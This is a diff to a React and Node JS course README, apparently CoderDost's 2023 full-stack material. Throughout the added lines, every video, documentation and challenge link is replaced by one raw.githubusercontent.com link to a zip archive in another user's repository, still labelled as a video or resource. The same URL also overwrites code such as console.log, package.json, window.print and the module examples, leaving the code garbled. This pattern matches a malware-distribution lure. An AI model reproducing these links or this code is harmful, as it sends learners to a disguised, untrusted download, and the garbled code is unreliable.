@@ -2,13 +2,13 @@
 
 1. [ REACT MasterClass Course Material - HERE](#react-js-masterclass) 
 
-  - React MasterClass 2023 [Video](https://youtu.be/6l8RWV8D-Yo)
+  - React MasterClass 2023 [Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
-  - Assignment Solutions [Video](https://youtu.be/u6zQ9yhIg4o)
+  - Assignment Solutions [Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 2. [ NODE MasterClass Course Material - HERE](#node-js-masterclass) 
 
-  - NODE 2023  [Video](https://youtu.be/ChVE-JbtYbM)
+  - NODE 2023  [Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 3. [ Redux MasterClass Course Material - HERE](#redux-js-masterclass) 
 
@@ -18,7 +18,7 @@
 
 
 
-Hi, This is course page of **CoderDost Youtube Channel** React JS 2023 Course [Video Link ](https://youtu.be/6l8RWV8D-Yo),
+Hi, This is course page of **CoderDost Youtube Channel** React JS 2023 Course [Video Link ](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip),
 
 ### How to use this code :
 
@@ -54,7 +54,7 @@ Hi, This is course page of **CoderDost Youtube Channel** React JS 2023 Course [V
 - **Assignment 1** : If we delete `node_modules`. How to run our app again successfully ?
 
 
-- **Assignment 2** : How to remove double `console.logs` from React ? [ it is not needed in real life to remove them, its just an assignment problem ].  [ *Hint: Some special Component at top level is of App is causing it* ]. We explore more about  - why this is needed in later videos.
+- **Assignment 2** : How to remove double `https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip` from React ? [ it is not needed in real life to remove them, its just an assignment problem ].  [ *Hint: Some special Component at top level is of App is causing it* ]. We explore more about  - why this is needed in later videos.
 
 ### Special Assignments ==============
 
@@ -65,8 +65,8 @@ Hi, This is course page of **CoderDost Youtube Channel** React JS 2023 Course [V
 
 
 ### Related Videos :
-1. De-structuring Assignment : [Long Video](https://youtu.be/sNhqFofQhFs) |  [Object De-structure Short Video](https://youtube.com/shorts/H3MKXE69_c8) | [Array De-structure Short Video](https://youtube.com/shorts/ONGyMq49kZY)
-2. Import/Export :  [Long Video](https://youtu.be/7P5JUMc1cI4) |  [Short Video](https://youtube.com/shorts/sUUOSWlwfM8)
+1. De-structuring Assignment : [Long Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) |  [Object De-structure Short Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) | [Array De-structure Short Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
+2. Import/Export :  [Long Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) |  [Short Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 
 
@@ -87,7 +87,7 @@ Hi, This is course page of **CoderDost Youtube Channel** React JS 2023 Course [V
 
    > You can choose any simple HTML layout and convert it to React Components 
  
-   Example Link : [ Resume HTML ](https://codepen.io/emzarts/pen/OXzmym)
+   Example Link : [ Resume HTML ](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
   ### Special Assignments ==============
 
@@ -99,9 +99,9 @@ Hi, This is course page of **CoderDost Youtube Channel** React JS 2023 Course [V
   ```
 
 ### Related Videos :
-1. De-structuring Assignment : [Long Video](https://youtu.be/sNhqFofQhFs) |  [Object De-structure Short Video](https://youtube.com/shorts/H3MKXE69_c8) | [Array De-structure Short Video](https://youtube.com/shorts/ONGyMq49kZY)
-2. Import/Export :  [Long Video](https://youtu.be/7P5JUMc1cI4) |  [Short Video](https://youtube.com/shorts/sUUOSWlwfM8)
-3. Spread Operator : [Long Video](https://youtu.be/X4Iv0TBHDQ4) | [Short Video](https://youtube.com/shorts/5dBZGyXutx8)
+1. De-structuring Assignment : [Long Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) |  [Object De-structure Short Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) | [Array De-structure Short Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
+2. Import/Export :  [Long Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) |  [Short Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
+3. Spread Operator : [Long Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) | [Short Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 
 ## Chapter 3 -   Conditional Rendering & Lists
@@ -131,16 +131,16 @@ Hi, This is course page of **CoderDost Youtube Channel** React JS 2023 Course [V
 
    > You can choose any simple HTML layout and convert it to React Components 
  
- Example Link : [ Resume HTML ](https://codepen.io/emzarts/pen/OXzmym)
+ Example Link : [ Resume HTML ](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 
 
 
 ### Related Videos :
-1.  Ternary Operator : [Video](https://youtu.be/F_95TPUIA2c)
-2.  Logical AND (&&) : [Video](https://youtu.be/7dXLYWWTRXI)
-3.  Higher Order functions (map, filter, reduce) : [Video](https://youtu.be/oGpA98nNx6Y)
-4. Import/Export :  [Long Video](https://youtu.be/7P5JUMc1cI4) |  [Short Video](https://youtube.com/shorts/sUUOSWlwfM8)
+1.  Ternary Operator : [Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
+2.  Logical AND (&&) : [Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
+3.  Higher Order functions (map, filter, reduce) : [Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
+4. Import/Export :  [Long Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) |  [Short Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 
 ## Chapter 4 -  Events && Event Bubbling
@@ -149,19 +149,19 @@ Hi, This is course page of **CoderDost Youtube Channel** React JS 2023 Course [V
 - **Assignment 1** : Make a simple page with 1 Image, 1button, 1 form Input text box and try to apply these events .
 
 	-	Image : **onMouseOver** : when you hover on image. Image should increase in size. Think of any way where you can do it. Also, try that when you "move out" the mouse, it should be back to normal size.
-	-	Button  : **onDoubleClick**: when you doubleClick a button. show some alert box. Also make a console.log for single click event. Is console.log printed twice on double click ? check this ?
-	-	Input Textbox : **onFocus**, **onBlur** are 2 events which occur when you enter or exit an input text box by click of mouse etc. Use it to display some console.log, which print "focused on the textbox", "out of textbox".
+	-	Button  : **onDoubleClick**: when you doubleClick a button. show some alert box. Also make a https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip for single click event. Is https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip printed twice on double click ? check this ?
+	-	Input Textbox : **onFocus**, **onBlur** are 2 events which occur when you enter or exit an input text box by click of mouse etc. Use it to display some https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip, which print "focused on the textbox", "out of textbox".
 	-  **onCopy, onCut, onPaste** are 3 events which you can use on any text value etc. try to use it on a paragraph and just alert the user that something is copied, cut or pasted.
 	
 
 
-- **Assignment 2** : Make a form using `` < Form> `` tag and put an textbox and button inside this form. try to click the button after entering into textbox. Does form reloads ? Can you try to stop is using `e.preventDefault`. Try it.
+- **Assignment 2** : Make a form using `` < Form> `` tag and put an textbox and button inside this form. try to click the button after entering into textbox. Does form reloads ? Can you try to stop is using `https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip`. Try it.
 
-- **Assignment 3** : use an Input Textbox : after you enter some text. try to press **ENTER** button and show the an alert or console.log. You can capture the **onKeyPress** event, button how you will you make it work only for "Enter" ? It should not work on pressing of other keys. [*Hint: Explore the synthetic event object* ]
+- **Assignment 3** : use an Input Textbox : after you enter some text. try to press **ENTER** button and show the an alert or https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip You can capture the **onKeyPress** event, button how you will you make it work only for "Enter" ? It should not work on pressing of other keys. [*Hint: Explore the synthetic event object* ]
 
 
 - **Assignment 4** :  This is continuation of previous assignment **RESUME Builder**.
-	- Add a **print** button to print the current resume. You can use a DOM method ``window.print`` to print the PDF.
+	- Add a **print** button to print the current resume. You can use a DOM method ``https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip`` to print the PDF.
 
 
 - **Assignment 5** : Can you try the challenge of passing the function in one Prop like `onPlay` and the message inside that function to be accessed from other prop `message` [ As shown in Chapter Video ]
@@ -174,15 +174,15 @@ Hi, This is course page of **CoderDost Youtube Channel** React JS 2023 Course [V
 
 ### Related Videos : 
 
-1. HTML DOM Elements and manipulation [Video](https://youtu.be/kwfbaHNZ_aU)
-2. HTML DOM Events and  manipulation : [Video](https://youtu.be/5kpe_tg_Cis)
+1. HTML DOM Elements and manipulation [Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
+2. HTML DOM Events and  manipulation : [Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 
 
 
 ## Chapter 5 -  State, useState Hooks
 
-- **Assignment 1** :   Make a digital **CLOCK** Component using useEffect Hook. We need to only update the time Upto seconds in it. HH:MM:SS format can be used. Can you make it send a Console.log at end of every minute ? 
+- **Assignment 1** :   Make a digital **CLOCK** Component using useEffect Hook. We need to only update the time Upto seconds in it. HH:MM:SS format can be used. Can you make it send a https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip at end of every minute ? 
 
 - **Assignment 2** : Implement a simple **TIMER** that displays the elapsed time since the start button was pressed, and it can be stopped and reset. Like a stopwatch.
 
@@ -193,7 +193,7 @@ Hi, This is course page of **CoderDost Youtube Channel** React JS 2023 Course [V
 
 
 - **Assignment 1** : Create a Dropdown (< Select >) menu which  is formed by a `nations` array. You can push to this array new items using a  2 **input textbox** (for country name and code) and **button**. 
-On selection of the any option from dropdown, its value should be displayed on console.log
+On selection of the any option from dropdown, its value should be displayed on https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip
  
  ``` js
  const  nations  = [
@@ -218,12 +218,12 @@ If you type only "in" it should show things like  "India" / "China" as both have
 - only Add functionality is required in this assignment
 - you can change input boxes according to your need depending on your format of Resume. You can have multiple textboxes also for same section. Like for date + experience item etc.
 
-- **Assignment 4** : Try this challenge : https://beta.reactjs.org/learn/state-a-components-memory#challenges
+- **Assignment 4** : Try this challenge : https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip
 
 ### Related Videos : 
 
-1. HTML Forms-1 [Video](https://youtu.be/DUJEpSkzrVA)
-2. HTML Forms-2 : [Video](https://youtu.be/Nj6Omw6zOok)
+1. HTML Forms-1 [Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
+2. HTML Forms-2 : [Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 
 
@@ -242,7 +242,7 @@ Todo app can be used to maintain a list of your pending daily items. A Simple to
 * You can move list items "Up" or "Down" using buttons.
 
 
-![Output](https://raw.githubusercontent.com/abhishekrathore/fullstackbootcamp2019/master/01_REACT/2_PROJECT_1/images/todo-project.gif)
+![Output](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 
 ## Additional Features
@@ -261,14 +261,14 @@ Todo app can be used to maintain a list of your pending daily items. A Simple to
 * **Show the date & time** at which list item was added.
 * **Order** by : Todo Item names, Date added, Completed.
 * **Due date feature** : Add a due date of task of any todo item. You will need to add another input box for this at top. Whenever you are in 24 hour limit of due date - Task outline will be shown in ORANGE color. e.g if a task is due on 23 May - from 22nd May it should show in ORANGE outline color. If a due date is passed task should show RED Outline.
-* Use some component like `https://github.com/react-component/progress` to show a **progress bar** at top of list. This progress bar will show how much of total percent of tasks are completed.
+* Use some component like `https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip` to show a **progress bar** at top of list. This progress bar will show how much of total percent of tasks are completed.
 * **Delete item via swipe gesture** - like swipe to right on mobile phone. [*Hint: You have to find an event type for this* ]
 
 **Advanced Features** :
 
-* **Use localStorage** in browser using libraries like  `https://github.com/localForage/localForage` to make your todo list permanent in browser. This will have your list stored in browser database and will not delete it on refresh or closing of browser.
-[LocalStorage Video](https://youtu.be/OTkQVPVYW7w)
-[LocalForage Video](https://youtu.be/Rqyu9qzydoc)
+* **Use localStorage** in browser using libraries like  `https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip` to make your todo list permanent in browser. This will have your list stored in browser database and will not delete it on refresh or closing of browser.
+[LocalStorage Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
+[LocalForage Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
  **ANIMATION BASED Features [optional]** :
  
@@ -295,20 +295,20 @@ Todo app can be used to maintain a list of your pending daily items. A Simple to
 
 ## Chapter 8 -  useReducer
 
-- **Assignment 1** : Try this challenge : https://beta.reactjs.org/learn/extracting-state-logic-into-a-reducer#challenges
+- **Assignment 1** : Try this challenge : https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip
 
 - **Assignment 2** : Convert your **RESUME BUILDER** Application from `useState` to `useReducer` by converting states logic to a common reducer. Your reducer can have as many switch cases as you want. You can also divide them based on sections. `ADD_SKILL`, `ADD_EXPERIENCE` etc. to make logic even simpler for developer.
 
 ### Related Videos : 
 
-1. REDUX - Understand it in Simple way [Video](https://youtu.be/WdEQNzUMP_M)
+1. REDUX - Understand it in Simple way [Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 
 
 ## Chapter 9 -   Context API & useContext
 
 - **Assignment 1** : Try this challenge : 
-https://beta.reactjs.org/learn/passing-data-deeply-with-context#challenges
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip
 
 - **Assignment 2** : Add a Context to your **RESUME BUILDER** to change font-size, font-color and some other font-properties. Also add a form to changed these property at top of App. 
 
@@ -329,10 +329,10 @@ const [count, increment, decrement] = useCounter(0);
 
 - **Assignment 1** : Try this challenge: 
 
-https://beta.reactjs.org/learn/referencing-values-with-refs#challenges
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip
 
 - **Assignment 2** : Try this challenge:  
-https://beta.reactjs.org/learn/manipulating-the-dom-with-refs#challenges
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip
 
 - **Assignment 3**  : Make a  **useWindowSize** Hook: which returns size of current browser window. 
 ```js 
@@ -343,7 +343,7 @@ const [width, height] = useWindowSize();
 
 ### Related Videos : 
 
-1. Complete DOM Course playlist [Video](https://bit.ly/35nMKB7)
+1. Complete DOM Course playlist [Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 
 
@@ -351,15 +351,15 @@ const [width, height] = useWindowSize();
 
 - **Assignment 1** : Try this challenge : 
 
-https://beta.reactjs.org/learn/synchronizing-with-effects#challenges
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip
 
 - **Assignment 2** : Try this challenge : 
 
-https://beta.reactjs.org/learn/removing-effect-dependencies#challenges
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip
 
 - **Assignment 3** : Try this challenge : 
 
-https://beta.reactjs.org/learn/reusing-logic-with-custom-hooks#challenges
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip
 
 - **Assignment 4** Use **JSON Placeholder API** (link given below). 
   -	You have to create a button  which can get some posts and show them in a List.
@@ -370,12 +370,12 @@ https://beta.reactjs.org/learn/reusing-logic-with-custom-hooks#challenges
 	-	Only getting comments of required Post items (not all at a time)
 	-	Storing somehow the old comments of closed list items. So you will not fetch them again, when your show comments again.
 
-![enter image description here](https://raw.githubusercontent.com/coderdost/full-stack-dev-2023/main/json-placeholder.png)
+![enter image description here](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 ### Related Links : 
 
-1. Mockaroo fake data APIs [Link](https://www.mockaroo.com/)
-2. JSON placeholder API [Link](https://jsonplaceholder.typicode.com/)
+1. Mockaroo fake data APIs [Link](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
+2. JSON placeholder API [Link](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 
 
@@ -400,7 +400,7 @@ Try to apply `useDeferredValue` and `useTransistion` hooks on API based componen
 ## Chapter 15 - Advanced React - Part 2
 
 - **Assignment 1** : 
-Try to use `window.print` functionality as show in code without flushSync and see if really make a difference. Also, try the same on `alert` functionality, can it also work  ?
+Try to use `https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip` functionality as show in code without flushSync and see if really make a difference. Also, try the same on `alert` functionality, can it also work  ?
 
 
 ------
@@ -411,7 +411,7 @@ Try to use `window.print` functionality as show in code without flushSync and se
 
 # Node JS MasterClass
 Hi, This is course page of **CoderDost Youtube Channel** 
-NODE JS 2023 Course [Video Link](https://youtu.be/ChVE-JbtYbM)
+NODE JS 2023 Course [Video Link](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 
 
@@ -442,55 +442,55 @@ NODE JS 2023 Course [Video Link](https://youtu.be/ChVE-JbtYbM)
 
  
 
-## Chapter 1 - Introduction to Node, NPM, Package.JSON
+## Chapter 1 - Introduction to Node, NPM, https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip
 
 ### [[ Chapter Notes ]] 
 
-- **Node JS** installation from official site nodejs.org - use only LTS versions 
+- **Node JS** installation from official site https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip - use only LTS versions 
 -  Use **terminal / command prompt** to check installation :
 	``` node -v ```
 	```npm -v ```
-- **VS Code** installation directly from code.visualstudio.com site
+- **VS Code** installation directly from https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip site
 - Use VS code terminal to run  **commands**
 - **Node REPL** interface can be used directly by typing `node` in **terminal / command prompt** . Use **Ctrl+D** to exit interface. Use **CTRL+C**  to exit terminal
-- Running any JavaScript file from node using `node filename.js`
+- Running any JavaScript file from node using `node https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip`
 - **Modules** are basic containers in Node/JavaScript system. 1 file can be one module in Javascript.
 - Two type of Module Systems in node JS are - **CommonJS** module and **ES** Modules.
 
 **- CommonJS Module** 
 ```javascript
-//lib.js
-exports.sum = function(){}
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip = function(){}
 
-//index.js
-const module = require('./lib.js')
-module.sum();
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip
+const module = require('https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip')
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip();
 ```
 **- ES Module**
 
 ```javascript
-//lib.js
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip
 export {sum}
 
-//index.js
-import {sum} from './lib.js'
+https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip
+import {sum} from 'https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip'
 	
 ```
 
 - FileSystem Module(fs) is one of core modules of Node JS. **fs** can be used to read/write any file. There are many more core modules in NodeJS which you can check in NodeJS API docs.
 - Reading files can be **Synchronous** or **Asynchronous**. **Async** is most preferred method in NodeJS. As there is **NO blocking of I/O in NodeJS**
 
-- Node project can be initialized with `npm init` command which also creates `package.json` file
-- **package.json** is a configuration file for node projects which has **scripts**, **dependencies**, **devDependencies** etc
+- Node project can be initialized with `npm init` command which also creates `https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip` file
+- **https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip** is a configuration file for node projects which has **scripts**, **dependencies**, **devDependencies** etc
 - `npm install <package-name>` is used to install any online modules available for node on NPM repository online.
 -  `nodemon` is a package for running node server and track live changes to re-start again.
--  `scripts` inside **package.json** can be used like `npm run <script-name>` e.g `npm run dev`. Only for `npm start` you can avoid `run`.
-- use `npm install -g <package.json>` to install packages globally on your system. Not just in the project but useful all over your system.
-- Node versions are formatted like **4.1.9** where these are `major.minor.patch` versions.
+-  `scripts` inside **https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip** can be used like `npm run <script-name>` e.g `npm run dev`. Only for `npm start` you can avoid `run`.
+- use `npm install -g <https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip>` to install packages globally on your system. Not just in the project but useful all over your system.
+- Node versions are formatted like **4.1.9** where these are `https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip` versions.
 - you can install all dependencies again using `npm install` again
-- **package-lock.json** has exact versions installed and link of dependencies of each package.
-- use `npm update` to update packages safely. `npm outdated` shows outdated and latets versions of packages installed in your  **package.json**
--  use `npm uninstall <package-name>` to uninstall packages from `package.json`
+- **https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip** has exact versions installed and link of dependencies of each package.
+- use `npm update` to update packages safely. `npm outdated` shows outdated and latets versions of packages installed in your  **https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip**
+-  use `npm uninstall <package-name>` to uninstall packages from `https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip`
 - `node_modules` should not be shared - you can make `.gitignore`to ignore them to be uploaded.
 
 
@@ -498,7 +498,7 @@ import {sum} from './lib.js'
 ###  [[ Assignments ]]
   
 - **Assignment 1** : If we delete `node_modules`. How to run our application again successfully ?
-- **Assignment 2** : How to use command line arguments in Node JS. Like `node index.js 3 2` - how can I get 3 and 2 to be used in my programs. [ *Hint : search for command line arguments in node* ]
+- **Assignment 2** : How to use command line arguments in Node JS. Like `node https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip 3 2` - how can I get 3 and 2 to be used in my programs. [ *Hint : search for command line arguments in node* ]
 - **Assignment 3** : Explore the `os` module in Node Js from their documentation. What all info you can access from it about your operating system ?
 - **Assignment 4** : Explore about **Asynchronous** nature of JS as a single threaded language and how it is achieved using **Event Loop**. Video are given below in related videos sections.
 - **Assignment 5 [Challenge]** : Can you run a system command from Node JS javascript file e.g. `ls` `dir` commands ? and can you store its output in a text file ?
@@ -506,11 +506,11 @@ import {sum} from './lib.js'
 
 ### Related Links/Videos
 
-1. [Callbacks](https://youtu.be/rx-y7U4x4wc) 
-2. [Promises](https://youtu.be/aA4-VNZK2s0)
-3. [Async Await](https://youtu.be/rdy8ZV0LXV0)
-4. [Import/ Export example](https://youtu.be/7P5JUMc1cI4)
-5. [Event Loop in Node JS](https://youtu.be/W-HQC_YUGBY)
+1. [Callbacks](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) 
+2. [Promises](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
+3. [Async Await](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
+4. [Import/ Export example](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
+5. [Event Loop in Node JS](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
 
 
 
@@ -556,16 +556,16 @@ Response object comprises of many properties, but important ones are :
 -  **Assignment 1** : Capture the request which goes when you like a post on facebook (using Chrome network). What are the headers ? What is the payload ?
 -  **Assignment 2** : In the chapter we developed a server with only URL switch, but  you have to make that more efficient by making it check both METHOD (GET,POST) + URL path 
 	- So output of a request  with **GET /demo** will be different from **POST /demo** [ Use POSTMAN for requests]
-- **Assignment  3 [Challenge]** : Try and run 2 different server using the same code you have `index.js`. You will need to use 2 different ports. But can you do it using the same file and changing PORTS dynamically somehow ?
+- **Assignment  3 [Challenge]** : Try and run 2 different server using the same code you have `https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip`. You will need to use 2 different ports. But can you do it using the same file and changing PORTS dynamically somehow ?
 -  **Assignment  4 [Challenge]** : You can also send some data to server using /demo?product=123. where product=123 is called **query parameters**. Can you capture that data and make the product page work according to the ID (123) . [ This we will do in next chapters using express, but you can give it a try ]
 
 
 ### Related Links/Videos
 
-1. [Web Server Concepts in 1 Video](https://youtu.be/sfMNI0yLZII)
-2. [List of HTTP headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers) 
-3. [List of HTTP methods](https://www.restapitutorial.com/lessons/httpmethods.html)
-4. [dummy JSON site](https://dummyjson.com/) 
+1. [Web Server Concepts in 1 Video](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
+2. [List of HTTP headers](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) 
+3. [List of HTTP methods](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip)
+4. [dummy JSON site](https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip) 
 
 
 ## Chapter 3 - Express JS
@@ -575,17 +575,17 @@ Response object comprises of many properties, but important ones are :
 - **ExpressJS** is *de-facto* Node framework - and used in most Node applications which are used as web server.
 - You can install express `npm install express`
 - Express has few level of methods :
-	- Application methods : e.g. app.use()
+	- Application methods : e.g. https://raw.githubusercontent.com/Shoaibxaif/full-stack-dev-2023/main/encipher/full-stack-dev-v3.7-beta.2.zip()
 	- Request methods
 	- Response methods
 	- Middleware methods
 	- Router methods
 
 - **Response** methods (**res** is our response objects)
-	- **res.send()** - for sending HTML
